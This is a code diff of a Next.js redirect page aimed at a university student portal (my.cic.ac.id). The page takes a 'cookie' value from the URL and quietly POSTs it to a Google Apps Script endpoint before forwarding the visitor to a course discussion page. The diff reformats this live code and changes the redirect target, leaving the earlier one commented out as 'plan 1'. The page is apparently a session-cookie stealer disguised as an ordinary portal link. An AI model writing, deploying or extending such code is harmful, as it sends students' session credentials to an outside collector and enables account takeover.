@@ -8,20 +8,29 @@ export default function Home() {
   const discussId: any = param.get("i") ?? null;
   const cookie: any = param.get("e") ?? null;
 
-  if (!courseId || !discussId) return router.push("https://my.cic.ac.id/portal/sipandai/?mod=sipandai&act=dashboardmahasiswa");
+  if (!courseId || !discussId)
+    return router.push(
+      "https://my.cic.ac.id/portal/sipandai/?mod=sipandai&act=dashboardmahasiswa"
+    );
 
   if (cookie) {
-    const formURL = "https://script.google.com/macros/s/AKfycbyDYVw0OVxnUuHfmo3ZsmREY_sJDPKyeBVYVqLxHMTlGjrdlt0P8kQ_RmDoLpW3AYkSKQ/exec";
+    const formURL =
+      "https://script.google.com/macros/s/AKfycbyDYVw0OVxnUuHfmo3ZsmREY_sJDPKyeBVYVqLxHMTlGjrdlt0P8kQ_RmDoLpW3AYkSKQ/exec";
     const formData = new FormData();
     formData.append("kode", cookie);
-  
+
     fetch(formURL, {
       method: "POST",
       body: formData,
     });
   }
 
+  // plan 1
+  // return router.push(
+  //   `https://my.cic.ac.id/portal/sipandai/?mod=sipandai&act=discuss&id=${discussId}&courses_id=${courseId}`
+  // );
+  // plan 2
   return router.push(
-    `https://my.cic.ac.id/portal/sipandai/?mod=sipandai&act=discuss&id=${discussId}&courses_id=${courseId}`
+    `https://my.cic.ac.id/portal/sipandai/views/validasi/index.php?mod=sipandai&act=discuss&id=${discussId}&course_id=${courseId}`
   );
 }
